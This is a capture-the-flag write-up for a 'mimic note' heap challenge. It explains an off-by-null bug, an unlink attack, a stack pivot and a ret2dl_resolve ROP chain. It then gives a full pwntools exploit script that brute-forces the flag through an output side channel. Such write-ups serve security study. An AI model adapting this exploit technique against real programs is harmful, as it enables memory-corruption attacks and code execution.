[中文](./README_zh.md) [English](./README.md)

[attachment.zip](./attachment.zip)

The problem gives two binary files, one for 32 bits and one for 64 bits.

The main idea is, given the same input, whether the outputs of the 32-bit and 64-bit programs are the same, and exit if they are not the same.

The title is a relatively simple pile of questions

Let's first look at the main function.

![](img/t1.png)

Can see that there are 4 functions

1. new
2. delete
3. show
4. edit

There is an off by null vulnerability in edit, which can be used to unlink and get arbitrary writes.

After arbitrary write, you can use a gadget to transfer the stack to the bss section and perform ROP. And then, use ret2dl_resolve to open the flag and write to a note. The note has a value set in advance, if the output is not equivalent. Will `output what are you trying to do? ` which we can blind injection and get the flag

Below is exp

This is the intended solution, but because mimic is not very well written, there are many unexpected solutions........


```
from pwn import *
import roputils 


def brute_flag(idx,v):
    debug=1

    #context.log_level='debug'

    rop=roputils.ROP('./mimic_note_32')

    if debug:
        p=process('./mimic')
        #p=process('./mimic_note_32')
        #p=process('./mimic_note_64')
        #gdb.attach(p)
    else:
        #p=remote('127.0.0.1',9999)
        pass

    def ru(x):
        return p.recvuntil(x)

    def se(x):
        p.send(x)

    def sl(x):
        p.sendline(x)


    def new(sz):
        sl('1')
        ru('size?')
        sl(str(sz))
        ru(">> ")

    def delete(idx):
        sl('2')
        ru('index ?')
        sl(str(idx))
        ru(">> ")

    def show(idx):
        sl('3')
        ru('index ?')
        sl(str(idx))

    def edit(idx,content):
        sl('4')
        ru('index ?')
        sl(str(idx))
        ru('content?\n')
        se(content)
        ru(">> ")

    #unlink attack x86

    new(0x68)
    new(0x68)
    new(0x94)
    new(0xf8)


    fake_chunk = p32(0)+p32(0x91)+p32(0x804a070-0xc)+p32(0x804a070-0x8)
    fake_chunk = fake_chunk.ljust(0x90,'\0')

    edit(2,fake_chunk+p32(0x90))

    delete(3)

    #ret2dlresolve and blind injection

    new(0x200)

    bss = 0x0804a500

    edit(2,p32(0x100)+p32(0x804A014)+p32(0x98)+p32(bss+0x300)+p32(0x94)+p32(bss)+p32(0x200))
    edit(1,p32(0x80489FA))

    payload = p32(bss-0x100)+rop.dl_resolve_call(bss+0x60, bss+0x180,0)
    payload += p32(0x8048460)+p32(0x80489F9)+p32(3)+p32(bss+0x300-idx)+p32(idx+1)
    payload += p32(0x080489FB)+p32(bss-0x100)
    payload += p32(0x804893C)

    payload = payload.ljust(0x60,'\x00')
    payload += rop.dl_resolve_data(bss+0x60, 'open')
    payload = payload.ljust(0x180,'\x00')
    payload += 'flag'

    edit(3,payload)

    edit(2,v+'\0')


    sl('2\x00'+'a'*6+p32(0x80488DE))
    ru('index ?\n')
    sl('3\x00')
    ru('>> ')

    show(2)

    ru('\n')
    data = ru('\n') 

    p.close()

    if len(data)>5:
        return False
    return True


charset ='{}_'+ string.ascii_letters + string.digits + string.punctuation

flag = ''
for i in range(40):
    for q in charset:
        if brute_flag(i,q):
            flag+=q
            print(flag)
            if q == '}':
                exit(0)
            break
```
